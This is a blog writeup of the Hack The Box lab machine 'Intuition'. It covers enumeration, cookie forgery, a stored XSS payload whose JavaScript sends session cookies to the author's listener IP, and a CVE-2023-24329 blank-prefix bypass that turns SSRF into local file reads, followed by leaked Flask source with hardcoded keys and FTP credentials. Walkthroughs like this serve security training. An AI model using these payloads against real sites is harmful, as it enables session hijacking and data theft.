---
layout: writeup
category: HTB
description: Intuition is a linux hard machine with a lot of steps involved. First, I will abuse a web application vulnerable to XSS to retrieve adam's and later admin's cookies. From admin panel, I will exploit [CVE-2023–24329](https://nvd.nist.gov/vuln/detail/CVE-2023-24329) to bypass url scheme restrictions in a "Create Report PDF" functionality and have LFI (file://) from the SSRF. I will use the LFI to analyze the source code of the flask application and see it's using a ftp credential for doing backup. With that ftp credential I will use the ftp:// wrapper and see a ssh private key with a welcome_note that says the private key passphrase that I can use to connect to ssh as dev_acc. From there, I will see an users.db sqlite file with the hash of user adam which I can crack and use for the ftp service to see some backup files of a binary called "runner1". Then, in the logs of suricata, I can see a credential used for user lopez in ftp that I can use to ssh as lopez. This lopez user has a sudoers privilege that lets him run /opt/runner2/runner2 as any user he wants. Analyzing the binary with ghidra, I can see that it's calling a system function without sanitization with a user-controlled input and I can execute a bash shell as root. 
points: 40
solves: 1777
tags: xss cookie-hijacking cve-2023-24329 urllib ssrf ssrf-to-lfi url-wrappers ftp ssh-key ssh-key-comments sqlite hash-cracking binary-analysis suricata-logs sudoers ghidra command-execution
date: 2024-09-14
title: HTB Intuition writeup
comments: false
---

{% raw %}

Intuition is a linux hard machine with a lot of steps involved. First, I will abuse a web application vulnerable to XSS to retrieve adam's and later admin's cookies. From admin panel, I will exploit [CVE-2023–24329](https://nvd.nist.gov/vuln/detail/CVE-2023-24329) to bypass url scheme restrictions in a "Create Report PDF" functionality and have LFI (file://) from the SSRF. I will use the LFI to analyze the source code of the flask application and see it's using a ftp credential for doing backup. With that ftp credential I will use the ftp:// wrapper and see a ssh private key with a welcome_note that says the private key passphrase that I can use to connect to ssh as dev_acc. From there, I will see an users.db sqlite file with the hash of user adam which I can crack and use for the ftp service to see some backup files of a binary called "runner1". Then, in the logs of suricata, I can see a credential used for user lopez in ftp that I can use to ssh as lopez. This lopez user has a sudoers privilege that lets him run /opt/runner2/runner2 as any user he wants. Analyzing the binary with ghidra, I can see that it's calling a system function without sanitization with a user-controlled input and I can execute a bash shell as root. 

# Port recognaissance

I will start with a basic TCP port scanning with nmap to see which ports are open and see which services are running:

```python
❯ sudo nmap -sS -sVC -p- --open --min-rate 5000 -v -n -Pn 10.10.11.15 -oA intuition
# Nmap 7.94SVN scan initiated Fri Sep  6 17:16:30 2024 as: nmap -sS -sVC -p- --open --min-rate 5000 -v -n -Pn -oA intuition 10.10.11.15
Nmap scan report for 10.10.11.15
Host is up (0.041s latency).
Not shown: 63850 closed tcp ports (reset), 1683 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b3:a8:f7:5d:60:e8:66:16:ca:92:f6:76:ba:b8:33:c2 (ECDSA)
|_  256 07:ef:11:a6:a0:7d:2b:4d:e8:68:79:1a:7b:a7:a9:cd (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://comprezzor.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Sep  6 17:16:50 2024 -- 1 IP address (1 host up) scanned in 20.36 seconds
```

> [My used arguments for nmap](http://gabrielgonzalez211.github.io/blog/nmap-arguments.html)

## Port **80**:
It consists on a http port and it redirects to comprezzor.htb, so I will append this line to my /etc/hosts file for my linux system to know which IP should solve that domain:

```plaintext
10.10.11.15 comprezzor.htb
```
Also, I noticed that nginx/1.18.0 is the server used.

## Port **22**:
OpenSSH, useful when I get credentials/id_rsa but I don't have nothing right now.

# Web enumeration
Taking a look with curl, I don't see nothing that nmap hasn't detected yet:

```bash
❯ curl -i -s http://comprezzor.htb | head
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 06 Sep 2024 16:02:19 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 3408
Connection: keep-alive

<!DOCTYPE html>
<html>
<head>
```

The tool whatweb (to identify technologies on the webpage) neither shows nothing more that an email "support@comprezzor.htb":

```bash
❯ whatweb http://comprezzor.htb
http://comprezzor.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[support@comprezzor.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.15], Script, Title[Comprezzor], nginx[1.18.0]
```

In the browser, I can see it's a compression service:

![](/assets/images/Intuition/Pasted%20image%2020240906180701.png)

There's also a link in the bottom for reporting bugs going to report.comprezzor.htb, a new subdomain:

![](/assets/images/Intuition/Pasted%20image%2020240906180856.png)

I will add it to my /etc/hosts and enumerate it when I finish with this web.
Uploading a file just gives me the compressed file bytes and downloads it because the header "Content-Disposition: attachment; filename=test.txt.xz":

![](/assets/images/Intuition/Pasted%20image%2020240906181225.png)

As said in the web, the accepted files are docx, pdf and txt so I will try uploading a php file so in case the webserver interprets php and I somehow manage to know the route where that file is saved, be able to execute code. But it's different response and it redirects to / to show an error (the error is shown when I introduce the cookie it tries to set with Set-Cookie):

![](/assets/images/Intuition/Pasted%20image%2020240906181620.png)

![](/assets/images/Intuition/Pasted%20image%2020240906181842.png)

I could try putting one of the allowed extensions but before the extension I want (.php) to see if the server is programmed in a way that it just looks for the txt, pdf or docx string but it doesn't validate if it really ends in it. But it doesn't works:
![](/assets/images/Intuition/Pasted%20image%2020240906182034.png)

For now, nothing interesting here so I will look the another subdomain I saw in the main page (report.comprezzor.htb). Looking with curl, I don't see nothing interesting in the headers, only that it uses nginx:

```bash
❯ curl -i -s http://report.comprezzor.htb | less
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 06 Sep 2024 16:22:27 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 3166
Connection: keep-alive
<..SNIP..>
```

With whatweb, more the same:

```bash
❯ whatweb http://report.comprezzor.htb
http://report.comprezzor.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[support@comprezzor.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.15], Script, Title[Report - Comprezzor], nginx[1.18.0]
```

Looking in the browser, I can see it's a report submission page to report bugs as said in comprezzor.htb:

![](/assets/images/Intuition/Pasted%20image%2020240906182838.png)

Before reporting something I will take a look at the link that says "See exactly what happens to your report from here" to see exactly what happens to my report:

![](/assets/images/Intuition/Pasted%20image%2020240906183112.png)

It says two important things:
- It's reviewed by skilled developers
- If a bug seems important, the admins will review it

The "Report a Bug" button of before redirects to auth.comprezzor.htb/login, which I don't have in the /etc/hosts, so I will add it:

```bash
10.10.11.15 comprezzor.htb report.comprezzor.htb auth.comprezzor.htb
```

Now I can successfully go to that page, which says that to access that page (Report bug page), I need to login:

![](/assets/images/Intuition/Pasted%20image%2020240906183834.png)

I don't have any credentials, so I will register an account with username "gabri" and password "gabri123$!" and login:

![](/assets/images/Intuition/Pasted%20image%2020240906183958.png)

![](/assets/images/Intuition/Pasted%20image%2020240906184039.png)

The cookie it sets is in base64:

![](/assets/images/Intuition/Pasted%20image%2020240906184154.png)

And I can decode it:

```bash
❯ echo -n 'eyJ1c2VyX2lkIjogNiwgInVzZXJuYW1lIjogImdhYnJpIiwgInJvbGUiOiAidXNlciJ9fDFkOWQ1NzIxNjkxODg1ODY0YTNhNmU3OTU0NTAxZGNjZmYzZTk0MjE1M2FlNTY5MmJhZDRmM2RmM2U1NzQwMDE=' | base64 -d; echo
{"user_id": 6, "username": "gabri", "role": "user"}|1d9d5721691885864a3a6e7954501dccff3e942153ae5692bad4f3df3e574001
```

It has the user_id, username, role and a random string which I don't know what it is for. This seems vulnerable so I will try changing my role to admin and setting that cookie in the browser:

```bash
❯ echo -n '{"user_id": 6, "username": "gabri", "role": "admin"}|1d9d5721691885864a3a6e7954501dccff3e942153ae5692bad4f3df3e574001' | base64 -w 0;echo
eyJ1c2VyX2lkIjogNiwgInVzZXJuYW1lIjogImdhYnJpIiwgInJvbGUiOiAiYWRtaW4ifXwxZDlkNTcyMTY5MTg4NTg2NGEzYTZlNzk1NDUwMWRjY2ZmM2U5NDIxNTNhZTU2OTJiYWQ0ZjNkZjNlNTc0MDAx
```

It seems to work:

![](/assets/images/Intuition/Pasted%20image%2020240906184534.png)

But I don't have any admin functionality available and fuzzing routes doesn't gives anything:
```bash
❯ ffuf -w /opt/SecLists/Discovery/Web-Content/raft-large-words.txt -u http://report.comprezzor.htb/FUZZ -mc all -fc 404 -t 100

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://report.comprezzor.htb/FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/raft-large-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: all
 :: Filter           : Response status: 404
________________________________________________

:: Progress: [119600/119600] :: Job [1/1] :: 193 req/sec :: Duration: [0:11:45] :: Errors: 0 ::
```

So I will fuzz subdomains:

```bash
❯ ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.comprezzor.htb" -u http://comprezzor.htb -mc all -fs 178

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://comprezzor.htb
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.comprezzor.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 178
________________________________________________

auth                    [Status: 302, Size: 199, Words: 18, Lines: 6, Duration: 41ms]
report                  [Status: 200, Size: 3166, Words: 1102, Lines: 109, Duration: 40ms]
dashboard               [Status: 302, Size: 251, Words: 18, Lines: 6, Duration: 40ms]
:: Progress: [4989/4989] :: Job [1/1] :: 1063 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

I can see the new dashboard subdomain so I will add it to my /etc/hosts.
But it gives "Internal Server Error":

![](/assets/images/Intuition/Pasted%20image%2020240906200532.png)

So I will restore my original cookie and it says "Not enough permissions", so it is 100% the admin's dashboard:

![](/assets/images/Intuition/Pasted%20image%2020240906200621.png)

The only thing left is reporting a bug with a HTML payload that loads an non-existing image in my webserver to see if the panel of the one that reviews my reports is vulnerable to html injection:

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

![](/assets/images/Intuition/Pasted%20image%2020240906191716.png)

![](/assets/images/Intuition/Pasted%20image%2020240906191914.png)

And I receive requests confirming that both fields are vulnerable:

![](/assets/images/Intuition/Pasted%20image%2020240906191955.png)

# XSS
Now that I have confirmed an HTML injection vulnerability, I can try to do various things in the session of the one that reviews my reports using javascript. If the cookie doesn't have HttpOnly enabled, I can access it with javascript and in consequence exfiltrate it in my server. This is the case:

![](/assets/images/Intuition/Pasted%20image%2020240906192230.png)

So I will create a javascript file that takes the cookie and sends it to my server that will interpret in the victim's dashboard. This is the javascript file:

```javascript
var req = new XMLHttpRequest();
req.open("GET", "http://10.10.15.95/exfil?cookie=" + encodeURIComponent(btoa(document.cookie)), false);
req.send();
```

Now I will start the http server and send the payload `<img src=x onerror="eval('d=document; _=d.createElement(\'script\');_.src=\'http://10.10.15.95/script.js\';d.body.appendChild(_)')">` that will create a script element in the victim's dashboard and load my remote script:

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

![](/assets/images/Intuition/Pasted%20image%2020240906202602.png)

And I receive a request from 10.10.11.15 with the cookie url-encoded and base64-encoded:
![](/assets/images/Intuition/Pasted%20image%2020240910201921.png)

I will decode it and see the cookie:

```bash
❯ encoded_cookie="dXNlcl9kYXRhPWV5SjFjMlZ5WDJsa0lqb2dNaXdnSW5WelpYSnVZVzFsSWpvZ0ltRmtZVzBpTENBaWNtOXNaU0k2SUNKM1pXSmtaWFlpZlh3MU9HWTJaamN5TlRNek9XTmxNMlkyT1dRNE5UVXlZVEV3TmprMlpHUmxZbUkyT0dJeVlqVTNaREpsTlRJell6QTRZbVJsT0RZNFpETmhOelUyWkdJNA%3D%3D"
❯ php -r "echo urldecode('$encoded_cookie');" | base64 -d; echo
user_data=eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4
```

It's of "adam" user with "webdev" role:

```bash
❯ echo -n 'eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4' | base64 -d; echo
{"user_id": 2, "username": "adam", "role": "webdev"}|58f6f725339ce3f69d8552a10696ddebb68b2b57d2e523c08bde868d3a756db8
```

I will modify it in the browser and see I have access to dashboard.comprezzor.htb and I can see all the reports:

![](/assets/images/Intuition/Pasted%20image%2020240906200908.png)
# XSS 2 (admin cookie)

In the reports, I can see the ID, username who reported it, the title and priority. Then,  I remembered the link that talked about what exactly happens with the reports. If it's too important, it will be reviewed by the administrator. There is a "Set high priority button" in the view report page:

![](/assets/images/Intuition/Pasted%20image%2020240906201452.png)

I have access as adam, but not as administrator. I will do the same XSS as before but later, clicking on "Set High Priority". I will do it with adam's account:

![](/assets/images/Intuition/Pasted%20image%2020240906202406.png)

![](/assets/images/Intuition/Pasted%20image%2020240906201816.png)

![](/assets/images/Intuition/Pasted%20image%2020240906202719.png)

And my last received cookie is different:

![](/assets/images/Intuition/Pasted%20image%2020240906202919.png)

I will decode it and notice that it's from admin:

```bash
❯ encoded_cookie="dXNlcl9kYXRhPWV5SjFjMlZ5WDJsa0lqb2dNU3dnSW5WelpYSnVZVzFsSWpvZ0ltRmtiV2x1SWl3Z0luSnZiR1VpT2lBaVlXUnRhVzRpZlh3ek5EZ3lNak16TTJRME5EUmhaVEJsTkRBeU1tWTJZMk0yTnpsaFl6bGtNalprTVdReFpEWTRNbU0xT1dNMk1XTm1ZbVZoTWpsa056YzJaRFU0T1dRNQ%3D%3D"
❯ php -r "echo urldecode('$encoded_cookie');" | base64 -d; echo
user_data=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhMjlkNzc2ZDU4OWQ5
```

```bash
❯ echo -n 'eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhMjlkNzc2ZDU4OWQ5' | base64 -d; echo
{"user_id": 1, "username": "admin", "role": "admin"}|34822333d444ae0e4022f6cc679ac9d26d1d1d682c59c61cfbea29d776d589d9
```

So I will introduce it in the browser and I have access to new functionalities:

![](/assets/images/Intuition/Pasted%20image%2020240906203144.png)
# Admin dashboard enumeration

The "Full report list" link gives the list of all the reports, nothing interesting:

![](/assets/images/Intuition/Pasted%20image%2020240906203429.png)

The "Create a backup" button just says that the backup was completed and it doesn't gives any more information:

![](/assets/images/Intuition/Pasted%20image%2020240906203538.png)

In last place, the "Create PDF Report" link seems to be a Create PDF tool from an URL:

![](/assets/images/Intuition/Pasted%20image%2020240906203640.png)

I will introduce mine and see what happens:

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

![](/assets/images/Intuition/Pasted%20image%2020240906203756.png)

It just gives me the pdf of the html of the page:

![](/assets/images/Intuition/Pasted%20image%2020240906203832.png)

# SSRF

I will create a flask server in order to print the request headers and try to identify which technologies is using the "Create PDF report" page:

```python
from flask import Flask, request

app = Flask(__name__)

@app.route("/")
def index():
    print(f"\n[+] Request headers:\n\n{request.headers}")
    return ""

if __name__ == '__main__':
    app.run('0.0.0.0', port=80)

```

```bash
❯ python3 pdfTestServer.py
 * Serving Flask app 'pdfTestServer'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:80
 * Running on http://192.168.1.3:80
Press CTRL+C to quit
```

It's using urllib 3.11:

![](/assets/images/Intuition/Pasted%20image%2020240906204218.png)

Looking for schemas available for this library, I can see it supports a bunch of interesting ones like "file:///", "ftp://", "gopher://", etc:

![](/assets/images/Intuition/Pasted%20image%2020240906204827.png)

But for example `file:///` is restricted:

![](/assets/images/Intuition/Pasted%20image%2020240910202515.png)

![](/assets/images/Intuition/Pasted%20image%2020240910202527.png)

Searching for vulnerabilities of this version of urllib, I saw [CVE-2023–24329](https://vsociety.medium.com/cve-2023-24329-bypassing-url-blackslisting-using-blank-in-python-urllib-library-ee438679351d), which consists on that an attacker may be able to bypass blacklists using blank characters at the beginning of the url:

![](/assets/images/Intuition/Pasted%20image%2020240906204930.png)

So if I put it with spaces at the beginning ("  file:///etc/passwd"), I can successfully bypass it and see /etc/passwd of the server:

![](/assets/images/Intuition/Pasted%20image%2020240906205345.png)

![](/assets/images/Intuition/Pasted%20image%2020240906205404.png)

# Source code analysis

Looking at which command runs this webapp (/proc/self/cmdline), I can see it's a python server located in /app/code/app.py:

![](/assets/images/Intuition/Pasted%20image%2020240906211259.png)

![](/assets/images/Intuition/Pasted%20image%2020240906211306.png)

So I will look at its source code:

![](/assets/images/Intuition/Pasted%20image%2020240906211638.png)

![](/assets/images/Intuition/Pasted%20image%2020240906211739.png)

It's very uncomfortable to inspect it like this but I can open it with visual studio code and more or less put the code in a better way:

```python
from flask import Flask, request, redirect
from blueprints.index.index import main_bp
from blueprints.report.report import report_bp
from blueprints.auth.auth import auth_bp
from blueprints.dashboard.dashboard import dashboard_bp
  
app = Flask(__name__)
app.secret_key = "7ASS7ADA8RF3FD7"
app.config['SERVER_NAME'] = 'comprezzor.htb'
app.config['MAX_CONTENT_LENGTH'] = 5 * 1024 * 1024
  
# Limit file size to 5MB
ALLOWED_EXTENSIONS = {'txt', 'pdf', 'docx'}
  
app.register_blueprint(report_bp, subdomain='report')
app.register_blueprint(auth_bp, subdomain='auth')
app.register_blueprint(dashboard_bp, subdomain='dashboard')
  
if __name__ == '__main__':
	app.run(debug=False, host="0.0.0.0", port=80)
```

I can see the secret key but is not useful by now because I have access as admin. Another thing to see is that it's importing the functionality for each subdomain using blueprints. In python, when importing things in the current directory, '.' are like '/' to specify where is located the script. I will start by looking at the blueprints.auth.auth as it's the most interesting:

![](/assets/images/Intuition/Pasted%20image%2020240909120803.png)

![](/assets/images/Intuition/Pasted%20image%2020240909120851.png)

This is the beautified code:

```python
from flask import Flask, Blueprint, request, render_template, redirect, url_for, flash, make_response
from .auth_utils import *
from werkzeug.security import check_password_hash

app = Flask(__name__)
auth_bp = Blueprint('auth', __name__, subdomain='auth')

@auth_bp.route('/')
def index():
    return redirect(url_for('auth.login'))

@auth_bp.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        user = fetch_user_info(username)
        if (user is None) or not check_password_hash(user[2], password):
            flash('Invalid username or password', 'error')
            return redirect(url_for('auth.login'))
        serialized_user_data = serialize_user_data(user[0], user[1], user[3])
        flash('Logged in successfully!', 'success')
        response = make_response(redirect(get_redirect_url(user[3])))
        response.set_cookie('user_data', serialized_user_data, domain='.comprezzor.htb')
        return response
    return render_template('auth/login.html')

@auth_bp.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        user = fetch_user_info(username)
        
        if user is not None:
            flash('User already exists', 'error')
            return redirect(url_for('auth.register'))
        
        if create_user(username, password):
            flash('Registration successful! You can now log in.', 'success')
            return redirect(url_for('auth.login'))
        else:
            flash('Unexpected error occured while trying to register!', 'error')
            return render_template('auth/register.html')

@auth_bp.route('/logout')
def logout():
    pass
```

That are the handlers for login, register and logout. I can see that is using a lot of functionalities like create_user, serialize_user_data, fetch_user_info that are probably stored in auth_utils.py (`from .auth_utils import *`), so I will also download it:

![](/assets/images/Intuition/Pasted%20image%2020240909122404.png)

And this is the code:

```python
import sqlite3, os, base64, json, hmac, hashlib 
from werkzeug.security import generate_password_hash 
from functools import wraps 
from flask import flash, url_for, redirect, request 

SECRET_KEY = 'JS781FJS07SMSAH27SG'
USER_DB_FILE = os.path.join(os.path.dirname(__file__), 'users.db') 

def fetch_user_info(username): 
    with sqlite3.connect(USER_DB_FILE) as conn: 
        cursor = conn.cursor() 
        cursor.execute('SELECT * FROM users WHERE username = ?', (username,)) 
        user = cursor.fetchone() 
        if not user: 
            return None 
        else: return user 

def create_user(username, password, role='user'): 
    try: 
        with sqlite3.connect(USER_DB_FILE) as conn: 
            cursor = conn.cursor() 
            cursor.execute('INSERT INTO users (username, password, role) VALUES (?,?,?)', (username,generate_password_hash(password,'sha256'), role)) 
            conn.commit() 
            return True 
    except Exception as e: 
        return False 
    
def serialize_user_data(user_id, username, role): 
    data = { 'user_id': user_id, 'username': username, 'role': role }
    serialized_data = json.dumps(data).encode('utf-8') 
    signature = hmac.new(SECRET_KEY.encode('utf-8'), serialized_data, hashlib.sha256).hexdigest() 
    return base64.b64encode(serialized_data + b'|' + signature.encode('utf-8')).decode('utf-8')

def deserialize_user_data(serialized_data): 
    serialized_data = base64.b64decode(serialized_data) 
    serialized_data,received_signature = serialized_data.rsplit(b'|', 1) 
    expected_signature = hmac.new(SECRET_KEY.encode('utf-8'), serialized_data, hashlib.sha256).hexdigest() 
    if hmac.compare_digest(expected_signature.encode('utf-8'), received_signature): 
        decoded_data = serialized_data.decode('utf-8') 
        return json.loads(decoded_data) 
    else: 
        return None

def get_redirect_url(user_role): 
    if user_role == 'user': 
        return url_for('report.report_index') 
    else: 
        return url_for('dashboard.dashboard') 

def admin_required(view_func): 
    @wraps(view_func)
    def decorated_view(*args, **kwargs): 
        user_data = request.cookies.get('user_data') 
        if not user_data: 
            flash('You need to log in to access this page.', 'error') 
            return redirect(url_for('auth.login'))
        user_info = deserialize_user_data(user_data) 
        if user_info['role'] not in ['admin', 'webdev']: 
            flash('Not enough permissions. Login as an administrator user to access this resource', 'error')
            return redirect(url_for('auth.login')) 
        return view_func(*args, **kwargs) 
    return decorated_view 

def login_required(view_func): 
    @wraps(view_func) 
    def decorated_view(*args, **kwargs): 
        user_data = request.cookies.get('user_data') 
        if not user_data: 
            flash('You need to log in to access this page.', 'error') 
            return redirect(url_for('auth.login')) 
        return view_func(*args, **kwargs) 
    return decorated_view
```

It seems like there is a users.db file in the current directory but it's not the case. Now I will look at blueprints.dashboard.dashboard, which has a bunch of code:

![](/assets/images/Intuition/Pasted%20image%2020240909124242.png)

![](/assets/images/Intuition/Pasted%20image%2020240909124302.png)

This is the code:

```python
from flask import Blueprint, request, render_template, flash, redirect, url_for, send_file 
from blueprints.auth.auth_utils import admin_required, login_required, deserialize_user_data 
from blueprints.report.report_utils import get_report_by_priority, get_report_by_id, delete_report, get_all_reports, change_report_priority, resolve_report 
import random, os, pdfkit, socket, shutil
import urllib.request 
from urllib.parse import urlparse 
import zipfile 
from ftplib import FTP 
from datetime import datetime 

dashboard_bp = Blueprint('dashboard', __name__, subdomain='dashboard') 

pdf_report_path = os.path.join(os.path.dirname(__file__), 'pdf_reports') 
allowed_hostnames = ['report.comprezzor.htb'] 

@dashboard_bp.route('/', methods=['GET'])
@admin_required 
def dashboard(): 
    user_data = request.cookies.get('user_data') 
    user_info = deserialize_user_data(user_data) 
    if user_info['role'] == 'admin': 
        reports = get_report_by_priority(1)
    elif user_info['role'] == 'webdev': 
        reports = get_all_reports() 
        return render_template('dashboard/dashboard.html', reports=reports, user_info=user_info) 

@dashboard_bp.route('/report/', methods=['GET']) 
@login_required 
def get_report(report_id): 
    user_data = request.cookies.get('user_data') 
    user_info = deserialize_user_data(user_data) 
    if user_info['role'] in ['admin', 'webdev']:
        report = get_report_by_id(report_id) 
        return render_template('dashboard/report.html', report=report, user_info=user_info) 
    else: 
        pass 

@dashboard_bp.route('/delete/', methods=['GET'])
@login_required 
def del_report(report_id): 
    user_data = request.cookies.get('user_data') 
    user_info = deserialize_user_data(user_data) 
    if user_info['role'] in ['admin', 'webdev']: 
        report = delete_report(report_id) 
        return redirect(url_for('dashboard.dashboard')) 
    else: 
        pass 

@dashboard_bp.route('/resolve', methods=['POST']) 
@login_required 
def resolve(): 
    report_id = int(request.args.get('report_id')) 
    if resolve_report(report_id): 
        flash('Report resolved successfully!', 'success') 
    else: 
        flash('Error occurred while trying to resolve!', 'error') 
    
    return redirect(url_for('dashboard.dashboard')) 

@dashboard_bp.route('/change_priority', methods=['POST']) 
@admin_required 
def change_priority(): 
    user_data = request.cookies.get('user_data')
    user_info = deserialize_user_data(user_data) 
    if user_info['role'] != ('webdev' or 'admin'): 
        flash('Not enough permissions. Only admins and webdevs can change report priority.', 'error') 
        return redirect(url_for('dashboard.dashboard')) 
    report_id = int(request.args.get('report_id')) 
    priority_level = int(request.args.get('priority_level')) 
    if change_report_priority(report_id, priority_level):
        flash('Report priority level changed!', 'success') 
    else: 
        flash('Error occurred while trying to change the priority!', 'error') 
    
    return redirect(url_for('dashboard.dashboard'))

@dashboard_bp.route('/create_pdf_report', methods=['GET', 'POST']) 
@admin_required 
def create_pdf_report(): 
    global pdf_report_path 
    if request.method == 'POST': 
        report_url = request.form.get('report_url') 
        try: 
            scheme = urlparse(report_url).scheme 
            hostname = urlparse(report_url).netloc 
            try: 
                dissallowed_schemas = ["file", "ftp", "ftps"] 
                if (scheme not in dissallowed_schemas) and ((socket.gethostbyname(hostname.split(":")[0]) != '127.0.0.1') or (hostname in allowed_hostnames)): 
                    print(scheme) 
                    urllib_request = urllib.request.Request(report_url, headers={'Cookie': 'user_data=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhM'})
                    response = urllib.request.urlopen(urllib_request) 
                    html_content = response.read().decode('utf-8') 
                    pdf_filename = f'{pdf_report_path}/report_{str(random.randint(10000,90000))}.pdf'
                    pdfkit.from_string(html_content, pdf_filename) 
                    return send_file(pdf_filename, as_attachment=True) 
            except: 
                flash('Unexpected error!', 'error') 
                return render_template('dashboard/create_pdf_report.html') 
            else: 
                flash('Invalid URL', 'error') 
                return render_template('dashboard/create_pdf_report.html') 
        except Exception as e: 
            raise e 
    else: 
        return render_template('dashboard/create_pdf_report.html') 

@dashboard_bp.route('/backup', methods=['GET']) 
@admin_required 
def backup(): 
    source_directory = os.path.abspath(os.path.dirname(__file__) + '../../../') 
    current_datetime = datetime.now().strftime("%Y%m%d%H%M%S") 
    backup_filename = f'app_backup_{current_datetime}.zip'
    
    with zipfile.ZipFile(backup_filename, 'w', zipfile.ZIP_DEFLATED) as zipf: 
        for root, _, files in os.walk(source_directory): 
            for file in files: 
                file_path = os.path.join(root, file) 
                arcname = os.path.relpath(file_path, source_directory) 
                zipf.write(file_path, arcname=arcname) 
                try: 
                    ftp = FTP('ftp.local') 
                    ftp.login(user='ftp_admin', passwd='u3jai8y71s2') 
                    ftp.cwd('/') 
                    with open(backup_filename, 'rb') as file: 
                        ftp.storbinary(f'STOR {backup_filename}', file) 
                        ftp.quit() 
                        os.remove(backup_filename) 
                        flash('Backup and upload completed successfully!', 'success') 
                except Exception as e: 
                    flash(f'Error: {str(e)}', 'error') 
    
    return redirect(url_for('dashboard.dashboard'))
```

The `/backup` handler is interesting because it logins to the ftp server using hardcoded credentials and uploads some files of the source:

```python
@dashboard_bp.route('/backup', methods=['GET']) 
@admin_required 
def backup(): 
    source_directory = os.path.abspath(os.path.dirname(__file__) + '../../../') 
    current_datetime = datetime.now().strftime("%Y%m%d%H%M%S") 
    backup_filename = f'app_backup_{current_datetime}.zip'
    
    with zipfile.ZipFile(backup_filename, 'w', zipfile.ZIP_DEFLATED) as zipf: 
        for root, _, files in os.walk(source_directory): 
            for file in files: 
                file_path = os.path.join(root, file) 
                arcname = os.path.relpath(file_path, source_directory) 
                zipf.write(file_path, arcname=arcname) 
                try: 
                    ftp = FTP('ftp.local') 
                    ftp.login(user='ftp_admin', passwd='u3jai8y71s2') 
                    ftp.cwd('/') 
                    with open(backup_filename, 'rb') as file: 
